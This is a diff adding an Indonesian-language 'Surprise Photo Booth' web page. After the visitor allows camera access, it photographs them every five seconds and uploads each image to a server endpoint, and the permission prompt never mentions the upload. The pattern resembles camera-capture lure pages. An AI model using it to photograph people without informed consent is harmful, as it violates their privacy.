@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Auto Camera Capture</title>
+<style>
+    body { 
+        font-family: Arial; 
+        text-align: center; 
+        margin: 0;
+        padding: 20px;
+        background: #1a1a1a;
+        color: #fff;
+    }
+    .container {
+        max-width: 600px;
+        margin: 0 auto;
+    }
+    h2 {
+        font-size: 24px;
+        margin-bottom: 20px;
+    }
+    video {
+        width: 100%; 
+        max-width: 500px;
+        border-radius: 15px; 
+        margin: 20px auto;
+        box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        display: block;
+    }
+    canvas { 
+        display: none; 
+    }
+    .status {
+        background: rgba(255,255,255,0.1);
+        padding: 15px;
+        border-radius: 10px;
+        margin-top: 20px;
+        font-size: 14px;
+    }
+    .status.success {
+        background: rgba(46, 204, 113, 0.2);
+        border: 1px solid #2ecc71;
+    }
+    .countdown {
+        font-size: 48px;
+        font-weight: bold;
+        color: #3498db;
+        margin: 20px 0;
+    }
+    .photo-count {
+        font-size: 18px;
+        color: #95a5a6;
+        margin-top: 10px;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <h2>🎉 Surprise Photo Booth!</h2>
+    <p style="color: #95a5a6; font-size: 14px;">Klik "Allow" untuk izin kamera (hanya sekali)</p>
+    <div id="countdown" class="countdown"></div>
+    
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    
+    <div id="status" class="status">
+        🎥 Klik "Allow" di popup kamera...
+    </div>
+    
+    <div class="photo-count" id="photoCount">
+        Foto tersimpan: 0
+    </div>
+</div>
+
+<script>
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const statusDiv = document.getElementById("status");
+const countdownDiv = document.getElementById("countdown");
+const photoCountDiv = document.getElementById("photoCount");
+
+let photoCount = 0;
+let captureInterval = null;
+let countdownTimer = null;
+let nextCaptureIn = 5; // detik
+
+// Fungsi untuk ambil foto
+function capturePhoto() {
+    const ctx = canvas.getContext("2d");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+
+    const dataURL = canvas.toDataURL("image/png");
+
+    // Kirim gambar ke server
+    fetch("/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image: dataURL })
+    })
+    .then(res => res.json())
+    .then(data => {
+        photoCount++;
+        photoCountDiv.textContent = `Foto tersimpan: ${photoCount}`;
+        statusDiv.className = "status success";
+        statusDiv.textContent = `✅ Foto tersimpan: ${data.filename}`;
+        
+        // Reset status setelah 2 detik
+        setTimeout(() => {
+            statusDiv.className = "status";
+            statusDiv.textContent = "Menunggu foto berikutnya...";
+        }, 2000);
+    })
+    .catch(err => {
+        console.error(err);
+        statusDiv.className = "status";
+        statusDiv.textContent = "❌ Gagal menyimpan foto";
+    });
+}
+
+// Countdown untuk foto berikutnya
+function startCountdown() {
+    nextCaptureIn = 5;
+    countdownDiv.textContent = nextCaptureIn;
+    
+    countdownTimer = setInterval(() => {
+        nextCaptureIn--;
+        if (nextCaptureIn > 0) {
+            countdownDiv.textContent = nextCaptureIn;
+        } else {
+            countdownDiv.textContent = "📸";
+            setTimeout(() => {
+                countdownDiv.textContent = "";
+            }, 500);
+        }
+    }, 1000);
+}
+
+// Minta izin kamera
+navigator.mediaDevices.getUserMedia({ 
+    video: {
+        facingMode: "user", // kamera depan
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
+    } 
+})
+.then(stream => {
+    video.srcObject = stream;
+    statusDiv.className = "status success";
+    statusDiv.textContent = "✅ Kamera aktif - Foto otomatis dimulai";
+    
+    // Tunggu video siap, lalu mulai capture otomatis
+    video.addEventListener('loadedmetadata', () => {
+        // Foto pertama setelah 3 detik
+        setTimeout(() => {
+            capturePhoto();
+            startCountdown();
+            
+            // Foto otomatis setiap 5 detik
+            captureInterval = setInterval(() => {
+                capturePhoto();
+                clearInterval(countdownTimer);
+                startCountdown();
+            }, 5000);
+        }, 3000);
+        
+        // Mulai countdown untuk foto pertama
+        let initialCountdown = 3;
+        countdownDiv.textContent = initialCountdown;
+        const initialTimer = setInterval(() => {
+            initialCountdown--;
+            if (initialCountdown > 0) {
+                countdownDiv.textContent = initialCountdown;
+            } else {
+                clearInterval(initialTimer);
+            }
+        }, 1000);
+    });
+})
+.catch(err => {
+    console.error(err);
+    statusDiv.textContent = "❌ Tidak dapat mengakses kamera. Pastikan browser memiliki izin.";
+});
+
+// Cleanup saat halaman ditutup
+window.addEventListener('beforeunload', () => {
+    if (captureInterval) clearInterval(captureInterval);
+    if (countdownTimer) clearInterval(countdownTimer);
+    if (video.srcObject) {
+        video.srcObject.getTracks().forEach(track => track.stop());
+    }
+});
+</script>
+
+</body>
+</html>
